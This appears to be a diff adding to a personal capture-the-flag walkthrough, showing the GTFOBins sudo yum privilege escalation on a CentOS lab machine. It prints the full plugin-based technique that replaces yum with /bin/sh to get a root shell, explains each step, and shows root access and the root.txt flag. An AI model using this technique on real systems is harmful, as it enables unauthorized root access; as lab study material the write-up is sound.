@@ -366,3 +366,115 @@ CentOS Linux release 7.7.1908 (Core)
 Sudo -l shows jjameson has access to /usr/bin/yum
 From here gtfobins should be looked at to determine options for yum.
 
+The module provides the hint gtfobins so I searched for yum and found:
+
+```
+cat >/path/to/temp-dir/x<<EOF
+[main]
+plugins=1
+pluginpath=/path/to/temp-dir/
+pluginconfpath=/path/to/temp-dir/
+EOF
+
+cat >/path/to/temp-dir/y.conf<<EOF
+[main]
+enabled=1
+EOF
+
+cat >/path/to/temp-dir/y.py<<EOF
+import yum
+from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
+requires_api_version='2.1'
+def init_hook(conduit):
+  ...
+EOF
+
+yum -c /path/to/temp-dir/x --enableplugin=y
+```
+I found this on a walkthrough this its clearly based on the above exploit:
+```
+TF=$(mktemp -d)
+cat >$TF/x<<EOF
+[main]
+plugins=1
+pluginpath=$TF
+pluginconfpath=$TF
+EOF
+
+cat >$TF/y.conf<<EOF
+[main]
+enabled=1
+EOF
+
+cat >$TF/y.py<<EOF
+import os
+import yum
+from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
+requires_api_version='2.1'
+def init_hook(conduit):
+  os.execl('/bin/sh','/bin/sh')
+EOF
+
+sudo yum -c $TF/x --enableplugin=y
+```
+- A temporary directory ($TF) is created so the user has full control and clean, correct permissions for YUM to load files from.
+
+cat >$TF/x<<EOF writes a new file named x inside $TF.
+
+cat writes whatever follows until EOF into that file.
+
+YUM uses two layers of configuration, so two config files are created:
+
+1. Global YUM config override (x)
+Tells YUM:
+
+plugins=1 → enable plugin system
+
+pluginpath=$TF → load plugin Python files from $TF
+
+pluginconfpath=$TF → load plugin config files from $TF
+
+This overrides the normal plugin directories.
+
+2. Per‑plugin config (y.conf)
+enabled=1 → tells YUM to load the plugin named y
+
+If this were 0, YUM would ignore the plugin even if the .py file exists.
+
+3. Plugin code (y.py)
+A valid YUM plugin must define:
+
+requires_api_version='2.1' → ensures YUM accepts the plugin
+
+init_hook() → a function YUM calls immediately at startup
+
+Inside init_hook():
+
+Code
+os.execl('/bin/sh','/bin/sh')
+This replaces the YUM process with /bin/sh.
+Since YUM runs as root under sudo, the shell runs as root.
+
+4. Running YUM with the custom config
+Code
+sudo yum -c $TF/x --enableplugin=y
+YUM loads the plugin from $TF, executes init_hook(), and is replaced by a root shell.
+
+```
+sh-4.2# sudo yum -c $TF/x --enableplugin=y
+Loaded plugins: y
+No plugin match for: y
+sh-4.2# nono $TF/y.py
+sh: nono: command not found
+sh-4.2# nano $TF/y.py
+```
+Now check the user level and access the root.txt file.
+```
+sh-4.2# id
+uid=0(root) gid=0(root) groups=0(root)
+sh-4.2# cd /root
+sh-4.2# ls
+anaconda-ks.cfg  root.txt
+sh-4.2# cat root.txt
+eec3d53292b1821868266858d7fa6f79
+sh-4.2# 
